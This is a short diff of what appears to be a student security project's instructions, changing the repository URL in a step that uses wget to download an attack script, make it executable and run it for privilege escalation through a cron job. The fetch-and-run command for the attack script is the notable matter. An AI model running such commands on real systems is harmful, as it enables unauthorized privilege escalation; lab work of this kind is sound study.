@@ -47,7 +47,7 @@ yes
 
 2. Download all attack scripts which also executes privilege escalation exploiting Crobjob
 ```
-wget https://raw.githubusercontent.com/S692/ossas/main/Gp5_import_scripts_and_PE.sh && chmod +x Gp5_import_scripts_and_PE.sh
+wget https://raw.githubusercontent.com/S692/ICT3204C1G5/main/Gp5_import_scripts_and_PE.sh && chmod +x Gp5_import_scripts_and_PE.sh
 
 # Downloads scripts and run PE exploit
 ./Gp5_import_scripts_and_PE.sh
